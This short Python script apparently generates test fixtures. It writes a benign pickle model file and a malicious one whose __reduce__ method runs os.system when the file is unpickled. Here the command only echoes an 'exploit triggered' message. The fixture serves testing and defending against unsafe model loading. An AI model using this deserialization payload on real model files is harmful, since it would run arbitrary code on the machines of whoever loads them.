import pickle
import os

# 1. Create a safe/benign model file sample
safe_data = {"weights": [0.1, 0.2, 0.3], "version": "1.0"}
with open("safe_model.pkl", "wb") as f:
    pickle.dump(safe_data, f)

# 2. Create a simulated malicious exploit payload using __reduce__
# When unpickled, this triggers os.system instead of loading weights safely
class MaliciousPayload:
    def __reduce__(self):
        # Simulating an arbitrary command execution vector
        return (os.system, ("echo 'EXPLOIT TRIGGERED: Malicious code execution detected'",))

malicious_data = {"weights": MaliciousPayload(), "version": "1.0"}

with open("exploit_model.pkl", "wb") as f:
    # We use protocol=0 or higher; protocol doesn't stop the opcode from being written
    pickle.dump(malicious_data, f)

print("[+] Generated safe_model.pkl and exploit_model.pkl for testing.")